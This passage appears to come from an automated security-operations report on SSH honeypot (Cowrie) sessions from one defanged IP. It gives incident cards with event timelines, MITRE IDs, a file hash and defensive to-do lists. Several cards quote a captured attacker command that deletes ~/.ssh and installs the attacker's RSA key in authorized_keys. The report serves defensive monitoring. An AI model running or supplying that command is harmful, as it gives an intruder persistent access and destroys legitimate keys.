| `2026-05-03 22:29:41` | `cowrie.command.failed` |
| `2026-05-03 22:29:41` | `cowrie.log.closed` |
| `2026-05-03 22:29:42` | `cowrie.session.params` |
| `2026-05-03 22:29:42` | `cowrie.command.input` |
| `2026-05-03 22:29:42` | `cowrie.session.file_download` |
| `2026-05-03 22:29:42` | `cowrie.log.closed` |
| `2026-05-03 22:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac9819b74786

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:29 |
| **Last Seen** | 2026-05-03 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:29:43` | `cowrie.session.connect` |
| `2026-05-03 22:29:43` | `cowrie.client.version` |
| `2026-05-03 22:29:43` | `cowrie.client.kex` |
| `2026-05-03 22:29:43` | `cowrie.login.success` |
| `2026-05-03 22:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06790a112f9e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:31 |
| **Last Seen** | 2026-05-03 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:31:12` | `cowrie.session.connect` |
| `2026-05-03 22:31:12` | `cowrie.client.version` |
| `2026-05-03 22:31:12` | `cowrie.client.kex` |
| `2026-05-03 22:31:12` | `cowrie.login.success` |
| `2026-05-03 22:31:12` | `cowrie.session.params` |
| `2026-05-03 22:31:12` | `cowrie.command.input` |
| `2026-05-03 22:31:12` | `cowrie.command.failed` |
| `2026-05-03 22:31:12` | `cowrie.log.closed` |
| `2026-05-03 22:31:12` | `cowrie.session.params` |
| `2026-05-03 22:31:12` | `cowrie.command.input` |
| `2026-05-03 22:31:12` | `cowrie.session.file_download` |
| `2026-05-03 22:31:12` | `cowrie.log.closed` |
| `2026-05-03 22:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99e9e7f96f09

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:31 |
| **Last Seen** | 2026-05-03 22:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:31:14` | `cowrie.session.connect` |
| `2026-05-03 22:31:14` | `cowrie.client.version` |
| `2026-05-03 22:31:14` | `cowrie.client.kex` |
| `2026-05-03 22:31:14` | `cowrie.login.success` |
| `2026-05-03 22:31:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03863877ff01

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:34 |
| **Last Seen** | 2026-05-03 22:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:34:14` | `cowrie.session.connect` |
| `2026-05-03 22:34:14` | `cowrie.client.version` |
| `2026-05-03 22:34:14` | `cowrie.client.kex` |
| `2026-05-03 22:34:14` | `cowrie.login.success` |
| `2026-05-03 22:34:14` | `cowrie.session.params` |
| `2026-05-03 22:34:14` | `cowrie.command.input` |
| `2026-05-03 22:34:14` | `cowrie.command.failed` |
| `2026-05-03 22:34:14` | `cowrie.log.closed` |
| `2026-05-03 22:34:14` | `cowrie.session.params` |
| `2026-05-03 22:34:14` | `cowrie.command.input` |
| `2026-05-03 22:34:14` | `cowrie.session.file_download` |
| `2026-05-03 22:34:14` | `cowrie.log.closed` |
| `2026-05-03 22:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb29fafaae0

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:34 |
| **Last Seen** | 2026-05-03 22:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:34:15` | `cowrie.session.connect` |
| `2026-05-03 22:34:15` | `cowrie.client.version` |
| `2026-05-03 22:34:15` | `cowrie.client.kex` |
| `2026-05-03 22:34:16` | `cowrie.login.success` |
| `2026-05-03 22:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f580cffb57a9

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:35 |
| **Last Seen** | 2026-05-03 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:35:00` | `cowrie.session.connect` |
| `2026-05-03 22:35:00` | `cowrie.client.version` |
| `2026-05-03 22:35:00` | `cowrie.client.kex` |
| `2026-05-03 22:35:00` | `cowrie.login.success` |
| `2026-05-03 22:35:00` | `cowrie.session.params` |
| `2026-05-03 22:35:00` | `cowrie.command.input` |
| `2026-05-03 22:35:00` | `cowrie.command.failed` |
| `2026-05-03 22:35:00` | `cowrie.log.closed` |
| `2026-05-03 22:35:00` | `cowrie.session.params` |
| `2026-05-03 22:35:00` | `cowrie.command.input` |
| `2026-05-03 22:35:00` | `cowrie.session.file_download` |
| `2026-05-03 22:35:00` | `cowrie.log.closed` |
| `2026-05-03 22:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d229ac15900e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:35 |
| **Last Seen** | 2026-05-03 22:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:35:01` | `cowrie.session.connect` |
| `2026-05-03 22:35:01` | `cowrie.client.version` |
| `2026-05-03 22:35:01` | `cowrie.client.kex` |
| `2026-05-03 22:35:01` | `cowrie.login.success` |
| `2026-05-03 22:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a66b7477b00

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:36 |
| **Last Seen** | 2026-05-03 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:36:32` | `cowrie.session.connect` |
| `2026-05-03 22:36:32` | `cowrie.client.version` |
| `2026-05-03 22:36:32` | `cowrie.client.kex` |
| `2026-05-03 22:36:32` | `cowrie.login.success` |
| `2026-05-03 22:36:32` | `cowrie.session.params` |
| `2026-05-03 22:36:32` | `cowrie.command.input` |
| `2026-05-03 22:36:32` | `cowrie.command.failed` |
| `2026-05-03 22:36:32` | `cowrie.log.closed` |
| `2026-05-03 22:36:32` | `cowrie.session.params` |
| `2026-05-03 22:36:32` | `cowrie.command.input` |
| `2026-05-03 22:36:32` | `cowrie.session.file_download` |
| `2026-05-03 22:36:32` | `cowrie.log.closed` |
| `2026-05-03 22:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8515804c9c3

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:36 |
| **Last Seen** | 2026-05-03 22:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:36:33` | `cowrie.session.connect` |
| `2026-05-03 22:36:33` | `cowrie.client.version` |
| `2026-05-03 22:36:33` | `cowrie.client.kex` |
| `2026-05-03 22:36:33` | `cowrie.login.success` |
| `2026-05-03 22:36:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5732d3222330

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:38 |
| **Last Seen** | 2026-05-03 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:38:05` | `cowrie.session.connect` |
| `2026-05-03 22:38:05` | `cowrie.client.version` |
| `2026-05-03 22:38:05` | `cowrie.client.kex` |
| `2026-05-03 22:38:05` | `cowrie.login.success` |
| `2026-05-03 22:38:05` | `cowrie.session.params` |
| `2026-05-03 22:38:05` | `cowrie.command.input` |
| `2026-05-03 22:38:05` | `cowrie.command.failed` |
| `2026-05-03 22:38:05` | `cowrie.log.closed` |
| `2026-05-03 22:38:05` | `cowrie.session.params` |
| `2026-05-03 22:38:05` | `cowrie.command.input` |
| `2026-05-03 22:38:05` | `cowrie.session.file_download` |
| `2026-05-03 22:38:05` | `cowrie.log.closed` |
| `2026-05-03 22:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-271823f76002

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:38 |
| **Last Seen** | 2026-05-03 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:38:06` | `cowrie.session.connect` |
| `2026-05-03 22:38:06` | `cowrie.client.version` |
| `2026-05-03 22:38:06` | `cowrie.client.kex` |
| `2026-05-03 22:38:06` | `cowrie.login.success` |
| `2026-05-03 22:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e6974904a3

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:38 |
| **Last Seen** | 2026-05-03 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:38:53` | `cowrie.session.connect` |
| `2026-05-03 22:38:53` | `cowrie.client.version` |
| `2026-05-03 22:38:53` | `cowrie.client.kex` |
| `2026-05-03 22:38:53` | `cowrie.login.success` |
| `2026-05-03 22:38:53` | `cowrie.session.params` |
| `2026-05-03 22:38:53` | `cowrie.command.input` |
| `2026-05-03 22:38:53` | `cowrie.command.failed` |
| `2026-05-03 22:38:53` | `cowrie.log.closed` |
| `2026-05-03 22:38:54` | `cowrie.session.params` |
| `2026-05-03 22:38:54` | `cowrie.command.input` |
| `2026-05-03 22:38:54` | `cowrie.session.file_download` |
| `2026-05-03 22:38:54` | `cowrie.log.closed` |
| `2026-05-03 22:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f4ce3b953a3

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:38 |
| **Last Seen** | 2026-05-03 22:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:38:55` | `cowrie.session.connect` |
| `2026-05-03 22:38:55` | `cowrie.client.version` |
| `2026-05-03 22:38:55` | `cowrie.client.kex` |
| `2026-05-03 22:38:55` | `cowrie.login.success` |
| `2026-05-03 22:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83e2d800ab6

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:39 |
| **Last Seen** | 2026-05-03 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:39:38` | `cowrie.session.connect` |
| `2026-05-03 22:39:38` | `cowrie.client.version` |
| `2026-05-03 22:39:38` | `cowrie.client.kex` |
| `2026-05-03 22:39:38` | `cowrie.login.success` |
| `2026-05-03 22:39:38` | `cowrie.session.params` |
| `2026-05-03 22:39:38` | `cowrie.command.input` |
| `2026-05-03 22:39:38` | `cowrie.command.failed` |
| `2026-05-03 22:39:38` | `cowrie.log.closed` |
| `2026-05-03 22:39:38` | `cowrie.session.params` |
| `2026-05-03 22:39:38` | `cowrie.command.input` |
| `2026-05-03 22:39:38` | `cowrie.session.file_download` |
| `2026-05-03 22:39:38` | `cowrie.log.closed` |
| `2026-05-03 22:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36bdf4e1bf9c

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:39 |
| **Last Seen** | 2026-05-03 22:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:39:39` | `cowrie.session.connect` |
| `2026-05-03 22:39:39` | `cowrie.client.version` |
| `2026-05-03 22:39:39` | `cowrie.client.kex` |
| `2026-05-03 22:39:39` | `cowrie.login.success` |
| `2026-05-03 22:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64e981ac0e70

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:41 |
| **Last Seen** | 2026-05-03 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:41:06` | `cowrie.session.connect` |
| `2026-05-03 22:41:06` | `cowrie.client.version` |
| `2026-05-03 22:41:06` | `cowrie.client.kex` |
| `2026-05-03 22:41:06` | `cowrie.login.success` |
| `2026-05-03 22:41:06` | `cowrie.session.params` |
| `2026-05-03 22:41:06` | `cowrie.command.input` |
| `2026-05-03 22:41:06` | `cowrie.command.failed` |
| `2026-05-03 22:41:06` | `cowrie.log.closed` |
| `2026-05-03 22:41:06` | `cowrie.session.params` |
| `2026-05-03 22:41:06` | `cowrie.command.input` |
| `2026-05-03 22:41:06` | `cowrie.session.file_download` |
| `2026-05-03 22:41:06` | `cowrie.log.closed` |
| `2026-05-03 22:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b08089893f5d

| Field | Detail |
|---|---|
| **Source IP** | `182.18.161[.]165` |
| **First Seen** | 2026-05-03 22:41 |
| **Last Seen** | 2026-05-03 22:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 22:41:07` | `cowrie.session.connect` |
| `2026-05-03 22:41:07` | `cowrie.client.version` |
| `2026-05-03 22:41:07` | `cowrie.client.kex` |
| `2026-05-03 22:41:08` | `cowrie.login.success` |
| `2026-05-03 22:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.161[.]165` to AbuseIPDB if not already reported
- [ ] Block `182.18.161[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfffec826d61

| Field | Detail |
